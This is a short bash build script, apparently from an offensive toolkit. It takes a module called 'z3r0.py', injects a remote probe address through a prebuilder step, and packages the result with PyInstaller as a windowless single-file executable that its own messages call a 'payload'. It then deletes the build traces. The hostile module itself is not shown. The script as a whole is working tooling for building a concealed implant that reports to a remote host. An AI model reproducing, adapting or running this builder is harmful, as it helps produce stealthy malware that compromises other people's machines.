MODULE_FILENAME="z3r0.py"
OUTPUT_FILENAME=""

if [[ $2 != "" ]]
then
	OUTPUT_FILENAME=$2
	TEMP_FILE=$OUTPUT_FILENAME.py

	cp $MODULE_FILENAME $TEMP_FILE
	printf "[+] Running prebuilder.....\n"
	python3 prebuilder.py $1 $TEMP_FILE $TEMP_FILE

	if [[ $? -eq 0 ]]
	then
		printf "[+] Prebuild complete....\n"
		printf "[+] Running Pyinstaller....\n"
		pyinstaller --noconsole --onefile $TEMP_FILE
		printf "[+] Done : [Build]\n"

		rm -r build >& /dev/null
		rm -r *.spec >& /dev/null
		rm -r __pycache__ >& /dev/null
		rm -r $TEMP_FILE

		if [[ -z $3 ]]
		then
			printf "[!] Copying payload -> [CWD: '%s']\n" $(pwd)
			mv dist/$OUTPUT_FILENAME .
		else
			printf "[!] Copying  payload -> [DIR: '%s']\n" $3
			mv dist/$OUTPUT_FILENAME $3
		fi

		rm -r dist >& /dev/null
	else
		printf "%s\n" "[!!] Prebuilder return error code : $?"
	fi
else
	printf "%s\n" "[::] Builder : Usage ./build.sh  <remote-probe-addr> <output-module> <output-dir>"
fi
